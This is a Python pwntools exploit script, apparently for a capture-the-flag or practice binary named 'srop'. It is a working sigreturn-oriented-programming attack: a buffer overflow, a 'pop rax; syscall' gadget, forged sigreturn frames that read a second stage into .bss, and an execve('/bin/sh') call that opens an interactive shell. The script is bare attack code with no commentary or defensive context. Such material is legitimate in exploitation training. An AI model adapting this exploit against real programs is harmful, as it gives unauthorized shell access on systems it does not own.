#!/usr/bin/env python3
# Name: srop.py
from pwn import *
context.arch = 'x86_64'
p = process('./srop')
elf = ELF('./srop')
gadget = next(elf.search(asm('pop rax; syscall')))
syscall = next(elf.search(asm('syscall')))
read_got = elf.got['read']
binsh = '/bin/sh\x00'
bss = elf.bss()
frame = SigreturnFrame()
# read(0, bss, 0x1000)
frame.rax = 0        # SYS_read
frame.rsi = bss
frame.rdx = 0x1000
frame.rdi = 0
frame.rip = syscall
frame.rsp = bss
payload = b'A'*16
payload += b'B'*8
payload += p64(gadget)
payload += p64(15) # sigreturn
payload += bytes(frame)
p.sendline(payload)
# execve('/bin/sh', 0, 0)
frame2 = SigreturnFrame()
frame2.rip = syscall
frame2.rax = 0x3b # execve
frame2.rsp = bss + 0x500
frame2.rdi = bss + 0x108
rop = p64(gadget)
rop += p64(15)
rop += bytes(frame2)
rop += b'/bin/sh\x00'
p.sendline(rop)
p.interactive()